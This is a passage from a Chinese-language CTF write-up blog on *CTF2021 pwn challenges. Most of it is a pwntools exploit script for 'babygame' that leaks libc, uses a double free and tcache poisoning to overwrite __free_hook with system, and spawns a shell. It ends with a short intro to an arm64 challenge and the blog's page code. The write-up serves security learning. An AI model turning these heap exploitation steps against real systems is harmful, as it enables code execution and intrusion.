class="string">b&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;w&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;l&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;message:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    leak()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    double_free()</span><br><span class="line">    new(<span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)) <span class="comment"># a redundante chunk tested out</span></span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    new(<span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;m&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/22/hOBAxz4YWRQoaf2.png"></p>
<blockquote>
<p>æˆ‘æœ¬æ¥æƒ³é€šè¿‡stringç±»çš„åˆ›å»ºå’Œé‡Šæ”¾æ¥get shellçš„ï¼Œä½†æ˜¯æ²¡èƒ½æˆåŠŸâ€¦å¸Œæœ›æœ‰å¸ˆå‚…èƒ½å‘ŠçŸ¥åŸå› Or2</p>
</blockquote>
<blockquote>
<p>é™„ï¼šä¸€å¼ æœªå®Œæˆçš„å¯¹äºé¢˜ç›®æ–‡ä»¶ä¸­a1çš„åˆ†æå›¾ï¼š<del>ç”»åˆ°ä¸€åŠå®åœ¨æ˜¯åˆ†æä¸ä¸‹å»äº†</del></p>
<p><img src="https://i.loli.net/2021/01/22/re2Edkg3ROQJYoG.png" alt="image.png"></p>
<p>ä»¥åŠé¢˜ç›®ä¸­æœ‰ç€å¤§é‡çš„è¿™æ ·ä¸çŸ¥æ‰€è°“çš„æ··æ·†å‡½æ•°â€¦æœ‰æœºä¼šä¸€å®šè¦å»æš´æ¶å‡ºé¢˜äººï¼ˆx</p>
<p><img src="https://i.loli.net/2021/01/22/Jl9NXrpozegvfUy.png" alt="image.png"></p>
</blockquote>
<h1 id="0x03-babypac"><a href="#0x03-babypac" class="headerlink" title="0x03.babypac"></a>0x03.babypac</h1><p><a href="/download/starCTF2021/pwn/babypac.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-babypac.zip</a></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXå’ŒRELRO</p>
<p><img src="https://i.loli.net/2021/01/28/R4wx9ihydgnmjaq.png"></p>
<p>ä½†æ˜¯ä¸å…¶ä»–é¢˜ç›®æ‰€ä¸åŒçš„æ˜¯<strong>è¿™æ˜¯ä¸€ä¸ªarm64æ¶æ„çš„ç¨‹åº</strong></p>
<blockquote>
<p>å…³äºarm64æ¶æ„è°ƒè¯•ç›¸å…³è§<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3154">å…ˆçŸ¥ç¤¾åŒºï¼š ARM64 è°ƒè¯•ç¯å¢ƒæ­å»ºåŠ ROP å®æˆ˜ </a></p>
</blockquote>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/01/15/GLIBC-0X01-MALLOC-2.23-PART-II/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>ä¸Šä¸€é¡µ</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
              2021-01-20 02:33:00
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="ä¿¡æ¯å®‰å…¨">
                        <b>#</b> ä¿¡æ¯å®‰å…¨
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E2%AD%90CTF/" title="â­CTF">
                        <b>#</b> â­CTF
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86/" title="å †">
                        <b>#</b> å †
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/tcache-poisoning/" title="tcache poisoning">
                        <b>#</b> tcache poisoning
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/double-free/" title="double free">
                        <b>#</b> double free
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Use-After-Free/" title="Use After Free">
                        <b>#</b> Use After Free
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/02/01/FUZZ-0X00-AFL-I/" target="_self">
                <span>ä¸‹ä¸€é¡µ</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">ç›®å½•</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%BB%AA%E8%AE%BA"><span class="toc-text">0x00.ç»ªè®º</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-babyheap-Use-After-Free-tcache-poisoning"><span class="toc-text">0x01.babyheap - Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-babygame-double-free-tcache-poisoning"><span class="toc-text">0x02.babygame - double free + tcache poisoning</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-babypac"><span class="toc-text">0x03.babypac</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: 'è¯´ç‚¹ä»€ä¹ˆå‘—...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright Â© 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CTF.0X02%E3%80%91*CTF2021-Pwn%20WP + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F01%2F20%2FCTF-0X02-STARCTF2021-PWN%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
